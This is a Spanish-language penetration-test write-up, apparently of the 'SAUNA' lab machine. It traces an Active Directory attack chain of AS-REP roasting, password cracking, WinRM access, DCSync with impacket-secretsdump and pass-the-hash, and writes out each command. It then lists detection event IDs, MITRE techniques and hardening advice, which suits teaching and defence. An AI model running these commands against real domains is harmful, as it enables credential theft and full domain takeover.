# Informe de Seguridad - Evaluación de Host "SAUNA"

## 1. Resumen Ejecutivo

Se ha realizado una evaluación de seguridad sobre el host "SAUNA", identificado como un Controlador de Dominio en un entorno Active Directory.

Durante el análisis se identificó una cadena de ataque basada en:

- Enumeración de usuarios desde web pública
- Ataque AS-REP Roasting
- Movimiento lateral mediante credenciales válidas
- Escalada de privilegios mediante DCSync

### Impacto

- Compromiso de cuentas de dominio  
- Movimiento lateral entre usuarios  
- Extracción de hashes del dominio  
- Acceso como Administrador del dominio  

### Nivel de riesgo: **CRÍTICO**

---

## 2. Alcance

- Objetivo: SAUNA  
- Sistema: Windows Server (Active Directory)  
- Tipo de prueba: Black Box  
- Metodología: Enumeración → Explotación → Lateral Movement → Escalada  

---

## 3. Enumeración

### 3.1 Escaneo de puertos

    nmap -p- --min-rate 5000 -sS -Pn <IP>

### Puertos relevantes:

- 53 – DNS  
- 88 – Kerberos  
- 389 – LDAP  
- 445 – SMB  
- 5985 – WinRM  

👉 Esto indica entorno Active Directory

---

### 3.2 Enumeración web

Acceso a:

    http://<IP>

Hallazgo clave:

- Sección “Our Team” con nombres de empleados  

👉 Permite generar lista de usuarios

---

## 4. Explotación (Acceso inicial)

### 4.1 Generación de usuarios

Se crean combinaciones:

- nombre.apellido  
- inicial + apellido  
- apellido + nombre  

---

### 4.2 AS-REP Roasting

    impacket-GetNPUsers domain/usuario -request -no-pass -dc-ip <IP>

Resultado:

- Obtención de hash Kerberos  

---

### 4.3 Cracking

    john hash.txt --wordlist=rockyou.txt

Resultado:

- Credenciales válidas obtenidas  

---

### 4.4 Acceso WinRM

    evil-winrm -i <IP> -u usuario -p password

Resultado:

- Acceso como usuario: FSmith  

---

## 5. Movimiento lateral

### 5.1 Enumeración interna

- Usuarios identificados:
  - FSmith  
  - svc_loanmgr  

---

### 5.2 Credenciales en autologin

Se detecta:

- Credenciales almacenadas en sistema  

Resultado:

- Acceso como: svc_loanmgr  

---

## 6. Escalada de privilegios

### 6.1 Enumeración de permisos

    whoami /all

Hallazgo:

- Permisos de replicación de dominio  

---

### 6.2 Confirmación ACL

    dsacls "DC=EGOTISTICAL-BANK,DC=LOCAL"

Resultado:

- DS-Replication-Get-Changes  
- DS-Replication-Get-Changes-All  

---

### 6.3 Ataque DCSync

    impacket-secretsdump domain/user@<IP> -just-dc-ntlm

Resultado:

- Hash del Administrador  

---

### 6.4 Pass-the-Hash

    evil-winrm -i <IP> -u Administrator -H <hash>

Resultado:

    NT AUTHORITY\SYSTEM

---

## 7. Evidencias

- Hash Kerberos obtenido  
- Credenciales crackeadas  
- Acceso WinRM  
- Dump de hashes del dominio  
- Acceso como Administrador  

---

## 8. Visión SOC (Detección y Monitorización)

Aquí está el valor real.

---

### 8.1 Indicadores de compromiso (IoC)

- Múltiples solicitudes Kerberos sin autenticación (AS-REP)
- Accesos WinRM anómalos  
- Uso de cuentas de servicio  
- Replicación de AD sospechosa (DCSync)  

---

### 8.2 Logs relevantes

#### Security Log:

    Event ID 4768 → Kerberos TGT request  
    Event ID 4624 → Logon  
    Event ID 4672 → Privilegios elevados  

---

#### Directory Services:

    Event ID 4662 → Acceso a objetos AD (DCSync)

---

#### WinRM:

- Conexiones remotas desde IP no habitual  

---

### 8.3 Técnicas MITRE ATT&CK

- T1087 – Account Discovery  
- T1558.004 – AS-REP Roasting  
- T1078 – Valid Accounts  
- T1003.006 – DCSync  
- T1550 – Pass-the-Hash  

---

## 9. Recomendaciones

### 9.1 Kerberos

- Habilitar preautenticación en todas las cuentas  
- Monitorizar AS-REP requests  

---

### 9.2 Credenciales

- Evitar almacenamiento en texto plano  
- Rotación periódica  

---

### 9.3 Privilegios AD

- Revisar permisos de replicación  
- Aplicar principio de mínimo privilegio  

---

### 9.4 Monitorización

- Alertas por DCSync  
- Detección de uso anómalo de WinRM  

---

## 10. Conclusión

Cadena de ataque:

1. Enumeración web  
2. AS-REP Roasting  
3. Acceso inicial  
4. Movimiento lateral  
5. DCSync  
6. Pass-the-Hash  

El compromiso fue posible debido a:

- Mala configuración de Kerberos  
- Exposición de usuarios  
- Permisos excesivos en AD  
- Falta de monitorización  

Resultado: **compromiso total del dominio**
